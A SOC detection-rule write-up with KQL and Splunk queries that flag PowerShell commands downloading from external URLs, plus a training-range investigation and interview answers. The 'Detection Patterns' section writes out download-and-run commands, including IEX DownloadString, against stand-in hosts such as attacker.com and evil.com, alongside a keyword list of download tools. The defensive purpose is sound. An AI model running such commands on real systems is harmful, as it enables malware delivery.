# PowerShell Web Request Detection

Rule Type: Scheduled Analytics Rule  
MITRE ATT&CK: T1059.001 - PowerShell (Execution)  
Severity: HIGH  
Data Source: Windows Security Events (Event ID 4688)  
Platform: Azure Sentinel (KQL) | Splunk (SPL) | Securonix

---

## Rule Overview

**Purpose:**  
Detect PowerShell commands attempting to download files from external URLs, a common technique for malware delivery, command-and-control (C2), and living-off-the-land binary (LOLBin) attacks.

**Business Impact:**  
- Malware download prevention
- Command-and-control detection
- Data exfiltration identification
- Insider threat detection

**Detection Logic:**  
Monitor Event ID 4688 (process creation) for PowerShell execution with web request commands (Invoke-WebRequest, Invoke-RestMethod, DownloadFile, etc.) targeting external URLs.

**Related Investigation:** [Incident #193653](../investigations/incident-193653-powershell-web-request.md) - Real-world investigation using this detection rule.

## Azure Sentinel (KQL Query)

### Production Rule

```kql
// PowerShell Web Request Detection - Potential Malware Download
SecurityEvent
| where EventID == 4688  // Process creation
| where Process has_any ("powershell.exe", "pwsh.exe")  // PowerShell or PowerShell Core
| where ProcessCommandLine has_any (
    "Invoke-WebRequest",
    "Invoke-RestMethod", 
    "wget",
    "curl",
    "DownloadFile",
    "DownloadString",
    "DownloadData",
    "Net.WebClient",
    "Start-BitsTransfer"
)
| where ProcessCommandLine has_any ("http://", "https://", "ftp://")
| where ProcessCommandLine !has_any (
    "microsoft.com",
    "windowsupdate.com",
    "office.com"
)  // Whitelist legitimate domains
| project 
    TimeGenerated,
    Account,
    Computer,
    ProcessCommandLine,
    ParentProcessName,
    NewProcessId
| order by TimeGenerated desc
```

### Query Explanation

**Line-by-Line Breakdown:**

1. SecurityEvent - Query Windows Security Event logs
2. where EventID == 4688 - Process creation events only
3. where Process has_any (...) - Filter for PowerShell executables
4. where ProcessCommandLine has_any (...) - Web download commands
5. where ProcessCommandLine has_any ("http://", ...) - External URL required
6. where ProcessCommandLine !has_any (...) - Exclude legitimate Microsoft domains
7. project - Select relevant fields for investigation
8. order by TimeGenerated desc - Most recent first

## CRITICAL: ExecutionPolicy Bypass Clarification

**COMMON MISCONCEPTION:**

Many security professionals believe `-ExecutionPolicy Bypass` allows PowerShell to evade antivirus or EDR detection. **THIS IS INCORRECT.**

### What ExecutionPolicy Bypass Actually Does:

✅ ONLY disables: PowerShell script signing policy  
✅ Allows: Running unsigned scripts without prompt  
❌ DOES NOT bypass: Windows Defender, EDR, antivirus, firewalls  
❌ DOES NOT hide: Command-line logging, process creation events  
❌ DOES NOT prevent: AMSI (Antimalware Scan Interface) inspection

### What Still Detects Malicious Activity:

- Windows Defender: Scans downloaded files regardless of ExecutionPolicy
- EDR Solutions: Monitor process behavior, network connections
- Event ID 4688: Logs full command line with ExecutionPolicy flag visible
- AMSI: Inspects PowerShell script content at runtime

**Interview Talking Point:**  
"I clarified in my incident investigation that ExecutionPolicy Bypass is often misunderstood. It only affects PowerShell's script signing policy, not security controls. This is why command-line logging via Event 4688 is critical - it captures the full execution context regardless of ExecutionPolicy settings."

## Detection Patterns

### High-Risk Command Patterns

**Pattern 1: Direct File Download**
```powershell
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\temp\malware.exe'"
```

**Pattern 2: In-Memory Execution (IEX)**
```powershell
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
```

**Pattern 3: Encoded Command**
```powershell
powershell.exe -EncodedCommand <Base64String>
```

**Pattern 4: BITS Transfer (Stealthy)**
```powershell
Import-Module BitsTransfer; Start-BitsTransfer -Source "http://evil.com/payload" -Destination "C:\temp\file.exe"
```

## Splunk Translation (SPL)

### Splunk Correlation Search

```spl
index=windows EventCode=4688 
    (New_Process_Name="*\\powershell.exe" OR New_Process_Name="*\\pwsh.exe")
    (Process_Command_Line="*Invoke-WebRequest*" OR 
     Process_Command_Line="*Invoke-RestMethod*" OR
     Process_Command_Line="*wget*" OR
     Process_Command_Line="*curl*" OR
     Process_Command_Line="*DownloadFile*" OR
     Process_Command_Line="*DownloadString*" OR
     Process_Command_Line="*Net.WebClient*" OR
     Process_Command_Line="*Start-BitsTransfer*")
    (Process_Command_Line="*http://*" OR 
     Process_Command_Line="*https://*" OR
     Process_Command_Line="*ftp://*")
| search NOT (Process_Command_Line="*microsoft.com*" OR 
              Process_Command_Line="*windowsupdate.com*" OR
              Process_Command_Line="*office.com*")
| table _time, Account_Name, ComputerName, Process_Command_Line, Parent_Process_Name, New_Process_Id
| sort -_time
```

## Investigation Workflow - PICERL Applied

This detection rule triggered [Incident #193653](../investigations/incident-193653-powershell-web-request.md). Here's how the investigation unfolded:

### PREPARE
- Alert details: HIGH severity, PowerShell web request to external URL
- Detection rule: Event ID 4688 with ProcessCommandLine analysis
- Required tools: Log Analytics, MITRE ATT&CK reference

### IDENTIFY
Key Evidence from Event 4688:
- ProcessCommandLine: powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest..."
- Account: user123
- Computer: DESKTOP-TEST-01
- ParentProcessName: explorer.exe (user-initiated)

Analysis:
- EICAR test file = training exercise indicator
- Test username + test computer = cyber range environment
- 5-minute burst = anomalous but controlled

### CONTAIN
Decision Factors:
- Environment: LAW-Cyber-Range (training)
- Indicators: EICAR test file, test naming conventions
- Risk: Low (training exercise)

Production Response Would Be:
- Isolate endpoint immediately
- Disable user account
- Block external domain at firewall/proxy

### ERADICATE
Training Context: No eradication needed

Production Actions Would Include:
- Remove downloaded files
- Check for persistence mechanisms
- Scan for additional malware

### RECOVER
Verified:
- No lateral movement (Event 4624 network logons)
- No persistence (Event 4720, 4728)
- No privilege escalation

### LESSONS LEARNED
Key Takeaway: Command-line logging (Event 4688 with ProcessCommandLine) was absolutely critical. Without it, we'd only see "powershell.exe" with no context.

Group Policy Requirement:
```
Computer Configuration → Policies → Administrative Templates → System → Audit Process Creation
→ "Include command line in process creation events" = ENABLED
```

## Interview Talking Points

### Question: "Walk me through investigating a PowerShell alert"

**Answer (Reference Incident #193653):**

"I received a HIGH severity alert for PowerShell Invoke-WebRequest activity. I used the PICERL framework for systematic investigation.

First, I queried Event ID 4688 in Log Analytics to get the full command line. This showed me the exact PowerShell command - it was downloading from an external domain with ExecutionPolicy Bypass.

I clarified that ExecutionPolicy Bypass does NOT bypass antivirus - common misconception. It only disables PowerShell script signing checks.

Then I checked for lateral movement using Event 4624 network logons - nothing found. Checked for persistence with Event 4720 and 4728 - no new accounts or privilege escalation.

The key evidence that made me confident this was a training exercise: EICAR test file in the URL, username 'user123', computer name 'DESKTOP-TEST-01', and the LAW-Cyber-Range environment context.

In production, I would have contained immediately - isolated the endpoint, disabled the account, blocked the domain. But with training confirmed, I documented it as a lessons-learned exercise."

### Question: "How does this rule work in Securonix?"

**Answer:**

"In Sentinel, I use KQL to query SecurityEvent table for Event 4688. In Securonix, I'd query their normalized process creation logs using their correlation search language.

The field names differ - Sentinel calls it ProcessCommandLine, Securonix might call it CommandLine or process_cmdline - but the logic is the same: filter for powershell.exe + web download commands + external URLs.

The investigation methodology is platform-agnostic - PICERL framework applies whether I'm using Sentinel, Splunk, or Securonix."
